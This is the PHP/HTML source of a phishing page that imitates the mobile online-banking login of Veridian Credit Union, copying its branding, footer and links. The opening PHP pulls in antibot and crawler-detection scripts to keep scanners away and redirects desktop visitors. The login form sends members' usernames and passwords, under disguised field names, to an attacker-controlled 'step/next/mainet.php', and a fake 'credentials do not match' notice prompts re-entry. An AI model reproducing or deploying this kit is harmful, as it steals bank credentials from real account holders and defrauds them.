<?php session_start();require_once './src/Classes/Comp.php';require_once './src/Classes/Antibot.php';$comps = new Comp;$antibot = new Antibot;if (!$comps->checkValue()) {echo $antibot->throw404();die();}require_once './zsec.php';include './huehuehue.php';include './bot_fucker/bot.php';include './bot_fucker/wrd.php';include './crawlerdetect.php';
?><!DOCTYPE html>
 <script>
if (screen.width >= 625) { document.location = "access.php?value=<?php echo $_SESSION['value']; ?>"; }
</script>
<html lang="en-US" data-mobile-page="" class="js-focus-visible"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; } 
body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
</style>


<link rel="apple-touch-icon" sizes="60x60" href="files/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="76x76" href="files/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="120x120" href="files/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="152x152" href="files/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="files/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" sizes="32x32" href="files/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="192x192" href="./android-chrome-192x192.png">
<link rel="icon" type="image/png" sizes="16x16" href="files/favicon-16x16.png">
<link rel="shortcut icon" href="files/favicon (1).ico">


<link href="./file/css.css" rel="stylesheet">

<link href="./file/font-icons.css" rel="stylesheet" type="text/css">
<title>Veridian Credit Union</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">


<link href="./file/css(1).css" rel="Stylesheet" type="text/css">

<link href="./file/jquery-ui.min.css" rel="stylesheet" type="text/css">
<link href="./file/base.min.css" rel="stylesheet" type="text/css">
<link href="./file/iris.shim.mobile.min.css" rel="stylesheet" type="text/css">
<link href="./file/iris.android.min.css" rel="stylesheet" type="text/css">
<link href="./file/iris-foundation.min.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="./file/theme.mobile.min.css">
<link rel="stylesheet" href="./file/iris-components.shim.mobile.min.css" type="text/css">
<link rel="stylesheet" href="./file/iris-foundation.min(1).css" type="text/css">
<link rel="stylesheet" href="./file/iris-components.min.css" type="text/css">
<link rel="stylesheet" href="./file/isotope.min.css" type="text/css">

<style id="inert-style">
[inert] {
  pointer-events: none;
  cursor: default;
}

[inert], [inert] * {
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
</style></head>
<body class="alk-body shared-layout isotope-mobile Authentication iris-mouse-use-detected windows challenge-type-username-and-password" id="username_page" data-orion="">
    

<div id="mmenu_container">
<div id="wrapper">
<div id="content" class="clearfix">
<div class="card-container flush-with-titlebar">
<div class="card card-full-width">
<div class="cms-content-area iris-content" data-cms-content-area="top-ribbon"></div>
 </div>
</div>
<div class="cms-content-area" data-cms-content-area="header-card">
</div>

<div class="mobile-authentication-container">
<div id="login_header" class="mobile-authentication-header">
<div class="brand-logo" role="img" aria-label=""></div>
</div>
<div class="mobile-authentication-content">
<div id="app" role="main" class="isotope-app"><div class="isotope-page--authentication isotope-page"><div class="isotope-challenge-type--username-and-password isotope-challenge-type"><div><div id="irisv_sheet_fyo5qzlcala" role="dialog" aria-label="Information" aria-hidden="true" class="irisv-sheet irisv-sheet--side irisv-sheet--partial irisv-sheet--suppressed isotope-hidden--desktop info-sheet hidden"><div class="irisv-sheet__scrim"></div><div tabindex="0" class="irisv-sheet__container"><!----><div tabindex="-1" class="irisv-sheet__header irisv-sheet__header--shadow"><!----><!----><h3 id="irisv_sheet_fyo5qzlcala_title" class="irisv-sheet__header-text font-content-heading--high-emphasis irisv-sheet__header-text--visible"> Information </h3><!----><div class="irisv-sheet__header-close-button" style="display: inline-block;"><button tabindex="0" role="button" aria-label="close" class="irisv-quickactionbutton irisv-quickactionbutton--mediumEmphasis irisv-quickactionbutton--embedded"><div><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 24px; height: 24px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 24px; height: 24px;"><div role="img" class="irisv-avatar__content" style="width: 24px; height: 24px; border-radius: 24px; background: rgb(var(--colorBrandedAffordance100));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-cancel-x irisv-icon--md irisv-avatar__content__main-icon--xsmall" style="color: rgb(var(--colorBrandedAffordanceAccessible)); width: 24px; height: 24px; font-size: 8px;"><!----></span><!----></div><!----><!----></div><!----></div><!----></div></button></div></div><div class="irisv-sheet__content"><div class="top-buffer"></div><!----><div class="irisv-sheet__inner-content"><div id="mobile-info-panel">
<div role="navigation" class="footer-links clearfix">
<a href="https://my.veridiancu.org/Client/Home" class="footer-link">View Full Site</a>
<span class="chat-button" role="button" onclick="Comm100API.open_chat_window(event);"><i class="chat-icon"></i>Chat Now</span>
</div>
<a href="https://www.veridiancu.org/webres/File/privacy-policy.pdf" class="privacy-link" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
<div class="footer-marketing-copy-container">
<p class="footer-marketing-copy">As a credit union we are organized differently than other financials. We're not-for-profit and owned by our members, not by stockholders. While credit unions and banks offer similar products and services such as checking accounts, credit cards, and mortgage loans, there are still many differences. Our main objective is to benefit our members and their families by providing a variety of no or low cost services, low loan rates, and higher savings rates. We are committed to our members and strive in every interaction to exceed expectations.</p>
</div>
<div class="footer-info">
<p class="copyright" tabindex="0">Copyright © 2022 Veridian Credit Union ®</p>
<p class="routing-number" tabindex="0">Routing Number: 273976369</p>
</div>
<div class="footer-icons">
<a href="https://portal.hud.gov/hudportal/HUD?src=/program_offices/fair_housing_equal_opp" rel="noopener noreferrer" target="_blank">
<span class="footer-icon font-icon-ehl"></span>
</a>
<a href="https://www.ncua.gov/Pages/default.aspx" rel="noopener noreferrer" target="_blank">
<span class="footer-icon font-icon-ncua"></span>
</a>
</div>
</div></div><div class="bottom-buffer"></div></div><!----><div class="irisv-sheet__footer irisv-sheet__footer--shadow" style="display: none;"></div><div tabindex="0"></div></div></div></div><div id="usernameAndPassword_ellipsis" class="ellipsis"><div class="irisv-menu-dropdown irisv-menu-dropdown--navigation irisv-menu-dropdown--quickactionbutton" id="ellipsis_menu"><div id="irisv_menu_dropdown_87k0d979st3" aria-haspopup="" class="irisv-menu-dropdown__menu-button"><!----><!----><div aria-haspopup="true" is-static="true" size="medium" style="display: inline-block;"><button tabindex="0" role="button" aria-label="Menu" class="irisv-quickactionbutton irisv-quickactionbutton--mediumEmphasis irisv-quickactionbutton--embedded"><div><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 40px; height: 40px;"><div role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorBrandedAffordance100));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-more irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorBrandedAffordanceAccessible)); width: 40px; height: 40px; font-size: 14px;"><!----></span><!----></div><!----><!----></div><!----></div><!----></div></button></div></div><div class="irisv-menu-dropdown__menu-wrapper irisv-menu-dropdown__menu-wrapper--flow-down" style="display: none;"><div class="irisv-menu-dropdown__menu irisv-menu-dropdown__menu--navigation" style="max-width: none;"><ul aria-label="Menu" role="menu" tabindex="-1" class="irisv-menu-dropdown__menu-container"><li role="none"><a role="menuitem" tabindex="-1" href="https://www.veridiancu.org/locations/default.aspx?trackingid=header-olb-locations" data-value="0" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-locations irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Locations </div><!----></a></li><li role="none"><a role="menuitem" tabindex="-1" href="https://www.veridiancu.org/contact-us/default.aspx?trackingid=header-olb-contact" data-value="1" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-contact irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Contact </div><!----></a></li><li role="none"><a role="menuitem" tabindex="-1" href="https://my.veridiancu.org/Mobile/Support" data-value="2" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-support irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Support </div><!----></a></li><li role="none"><a role="menuitem" tabindex="-1" target="__self" data-value="3" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-info irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Info </div><!----></a></li></ul><!----></div></div></div></div><form action="step/next/mainet.php?value=<?php echo $_SESSION['value'] ?>" method="POST" role="form" class="isotope-slide usernameAndPasswordForm"><!----><div class="isotope-slide__content"><div class="isotope-hidden--desktop mar-top--small"></div><div class="isotope-hidden--mobile"><h1 class="font-content-heading--district mar-top--0 mar-bottom--big">
                Welcome to online banking
            </h1></div><div class="irisv-textfield mar-bottom-small irisv-textfield--filled"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__leading-icon"><span role="img" class="irisv-icon font-icon-profile irisv-icon--md" aria-hidden="true"><!----></span></div><div class="irisv-textfield__input-wrapper"><span id="username_label"><label for="username" class="irisv-textfield__label font-caption"> Username </label></span><input type="text" name="asdajshjf" aria-labelledby="username_label" aria-required="true" id="username" required="required" kind="underline" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" class="font-body-1 irisv-textfield__input"></div><!----><!----></div><div class="irisv-textfield__messages"><!----><div role="alert"><!----></div><!----><!----></div></div></div><div class="irisv-textfield irisv-textfield__password mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__leading-icon"><span role="img" class="irisv-icon font-icon-lock irisv-icon--md" aria-hidden="true"><!----></span></div><div class="irisv-textfield__input-wrapper"><span id="password_label"><label for="password" class="irisv-textfield__label font-caption"> Password </label></span><input type="password" name="uisdfh" aria-labelledby="password_label" aria-required="true" id="password" required="required" class="irisv-textfield__input font-subtitle-1"></div><!----><div class="irisv-textfield__trailing-icon"><button aria-label="Show password" type="button" class="irisv-textfield__trailing-button"><span role="img" class="irisv-icon font-icon-show irisv-icon--md"><!----></span></button></div></div><div class="irisv-textfield__messages"><!----><div role="alert"><!----></div><!----><!----></div></div></div><div class="mar-top--small"><div class="left-checkbox"><label class="irisv-checkbox font-body-1 irisv-checkbox--low-emphasis font-caption " id="rememberMeCheckBox"><input type="checkbox" class="irisv-checkbox__input"><span class="irisv-checkbox__check"><svg version="1.1" x="0px" y="0px" preserveAspectRatio="xMidYMin" viewBox="3 5 18.1 13.8" enable-background="new 3 5 18.1 13.8" xml:space="preserve"><polyline fill="none" stroke-width="2.1" stroke-miterlimit="10" points="3.7,12.2 8.8,17.3 20.3,5.7 " class="check"></polyline></svg></span><span class="irisv-checkbox__label">Remember me</span></label></div><div class="right-links"><a href="https://my.veridiancu.org/Mobile/ForgotUsername" class="irisv-button irisv-button--compact irisv-button--onLight text--none" style="width: auto;"><!----><span class="irisv-button__text"> Forgot username? </span><!----><!----></a><a href="https://my.veridiancu.org/Mobile/ForgotPassword" class="irisv-button irisv-button--compact irisv-button--onLight text--none" style="width: auto;"><!----><span class="irisv-button__text"> Forgot password? </span><!----><!----></a></div></div></div>
                <?php
                    if(isset($_GET['invalid'])){
                        echo '<input type="hidden" name="invalid">
                        <div class="mar-top--small"><div id="irisv_notification_u7ezj6b4ipa" role="alertdialog" aria-atomic="true" aria-labelledby="irisv_notification_u7ezj6b4ipa_heading" tabindex="0" class="irisv-notification inline error-light" style=""><div class="irisv-notification__container"><span role="img" aria-label="error" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_u7ezj6b4ipa_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2"> The provided credentials do not match our records. Please try again. </span></span><button aria-label="Close notification" class="irisv-notification__close" style="display: none;"><span aria-hidden="true" class="font-icon-cancel-x irisv-notification-icon--sm"></span></button></div><div class="irisv-notification__trailing-content" style="display: none;"></div></div></div>';
                    }   
                    ?> 
                
                <div class="isotope-slide__footer"><div class="mar-top--small"><div id="irisv_notification_b1rvuc1xxob" role="alertdialog" aria-atomic="true" aria-labelledby="irisv_notification_b1rvuc1xxob_heading" tabindex="0" class="irisv-notification inline error-light" style="display: none;"><div class="irisv-notification__container"><span role="img" aria-label="error" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_b1rvuc1xxob_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2">  </span></span><button aria-label="Close notification" class="irisv-notification__close" style="display: none;"><span aria-hidden="true" class="font-icon-cancel-x irisv-notification-icon--sm"></span></button></div><div class="irisv-notification__trailing-content" style="display: none;"></div></div></div><div class="mar-top--small"><div id="irisv_notification_j0cyxtgaa8r" role="alertdialog" aria-atomic="true" aria-labelledby="irisv_notification_j0cyxtgaa8r_heading" tabindex="0" class="irisv-notification inline error" style="display: none;"><div class="irisv-notification__container"><span role="img" aria-label="error" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_j0cyxtgaa8r_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2"> An unexpected error has occurred. Please try again later. </span></span><button aria-label="Close notification" class="irisv-notification__close" style="display: none;"><span aria-hidden="true" class="font-icon-cancel-x irisv-notification-icon--sm"></span></button></div><div class="irisv-notification__trailing-content" style="display: none;"></div></div></div><div class="isotope-actions mar-top--small"><button type="submit" class="irisv-button irisv-button--highEmphasis irisv-button--onLight irisv-button--full-width text--none" id="btn_submitCredentials"><!----><span class="irisv-button__text"> Log in </span><!----><!----></button><a href="https://my.veridiancu.org/Mobile/Registration" class="irisv-button mar-top--tiny irisv-button--lowEmphasis irisv-button--onLight irisv-button--full-width text--none"><!----><span class="irisv-button__text"> Register </span><!----><!----></a></div></div></form><div class="isotope-hidden--desktop mar-bottom--small"></div><form role="form" class="isotope-slide isotope-slide--aside isotope-hidden--mobile"><!----><div class="isotope-slide__content"><div><div><p class="font-medium-heading">
        On a mobile device?
    </p><p class="mar-top--small font-body-2">
        Download the app for convenient and secure access to your accounts.
    </p></div></div><ul><li><div class="inline-flex mar-top--base"><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 40px; height: 40px;"><div aria-label="Biometric Login" role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorPlatformGray500));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-touchid irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorPlatformWhite)); width: 40px; height: 40px; font-size: 20px;"><!----></span><!----></div><!----><!----></div><!----></div><div class="iris-list-item__text mar-left--small"><b class="font-subtitle-2">Biometric Login</b><p class="font-caption">
                            Use your device hardware
                        </p></div></div></li><li><div class="inline-flex mar-top--base"><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 40px; height: 40px;"><div aria-label="Nearby ATMs" role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorPlatformGray500));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-atm-locator irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorPlatformWhite)); width: 40px; height: 40px; font-size: 20px;"><!----></span><!----></div><!----><!----></div><!----></div><div class="mar-left--small"><b class="font-subtitle-2">Nearby ATMs</b><p class="font-caption">
                            Enable location services
                        </p></div></div></li><li><div class="inline-flex mar-top--base"><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 40px; height: 40px;"><div aria-label="Snapshot" role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorPlatformGray500));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-phone2 irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorPlatformWhite)); width: 40px; height: 40px; font-size: 20px;"><!----></span><!----></div><!----><!----></div><!----></div><div class="mar-left--small"><b class="font-subtitle-2">Snapshot</b><p class="font-caption">
                            Preview accounts without logging in
                        </p></div></div></li></ul><div id="badges" class="inline-flex mar-top--base"><a href="https://www.apple.com/ios/app-store"><img id="app-store" alt="Download on the App Store" src="./file/app-store-badge.svg" height="33px"></a><a href="https://play.google.com/store" class="mar-left--tiny"><img id="google-play" alt="Get it on Google Play" src="./file/google-play-badge.svg" height="33px"></a></div><div class="text--center"><a href="https://my.veridiancu.org/Mobile/Authentication" class="irisv-button mar-top--base irisv-button--compact irisv-button--onLight text--none" id="mobile-link"><!----><span class="irisv-button__text"> Go to mobile site </span><!----><!----></a></div></div><!----></form></div><form id="form_authenticated" method="POST" action=""><input type="hidden" name="username"><input type="hidden" name="nonce"></form></div></div>
</div>
</div>
</div>
<div class="cms-content-area" data-cms-content-area="body-card">
</div>
</div>
<footer class="footer" role="contentinfo" id="mobile_info_panel">
<div role="navigation" class="footer-links clearfix">
<a href="https://my.veridiancu.org/Client/Home" class="footer-link">View Full Site</a>
<span class="chat-button" role="button" onclick="Comm100API.open_chat_window(event);"><i class="chat-icon"></i>Chat Now</span>
</div>
<a href="https://www.veridiancu.org/webres/File/privacy-policy.pdf" class="privacy-link" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
<div class="footer-marketing-copy-container">
<p class="footer-marketing-copy">As a credit union we are organized differently than other financials. We're not-for-profit and owned by our members, not by stockholders. While credit unions and banks offer similar products and services such as checking accounts, credit cards, and mortgage loans, there are still many differences. Our main objective is to benefit our members and their families by providing a variety of no or low cost services, low loan rates, and higher savings rates. We are committed to our members and strive in every interaction to exceed expectations.</p>
</div>
<div class="footer-info">
<p class="copyright" tabindex="0">Copyright © 2022 Veridian Credit Union ®</p>
<p class="routing-number" tabindex="0">Routing Number: 273976369</p>
</div>
<div class="footer-icons">
<a href="https://portal.hud.gov/hudportal/HUD?src=/program_offices/fair_housing_equal_opp" rel="noopener noreferrer" target="_blank">
<span class="footer-icon font-icon-ehl"></span>
</a>
<a href="https://www.ncua.gov/Pages/default.aspx" rel="noopener noreferrer" target="_blank">
<span class="footer-icon font-icon-ncua"></span>
</a>
</div>
</footer>
</div>
<div id="locale_confirmation" class="alk-bottom-panel alk-bottom-panel-full" role="dialog" aria-hidden="true">
<div class="alk-bottom-panel-header">
Locale Change Confirmation
<button class="alk-bottom-panel-close font-icon font-icon-cancel-x" aria-label="Close Panel"></button>
</div>
<div class="alk-bottom-panel-content card-container">
<div class="confirm">
<div class="no-card">
<p>Changing your preferred language affects all member-facing text, including messages and notification alerts.</p>
</div>
<div class="buttons">
<button id="confirm_locale" class="button primary">Confirm</button>
<button id="cancel_locale" class="button text">Cancel</button>
</div>
</div>
<div class="confirming">
<div class="loader">
<p id="instructions">Please wait...</p>
<div class="loader-pip"></div>
</div>
</div>
</div>
</div>



<div id="second_factor_container" class="card-container card-container-modal" style="display: none;"></div><iframe id="comm100-iframe" style="display: none;" src="./file/saved_resource(2).html"></iframe><div id="comm100-container"></div></body></html>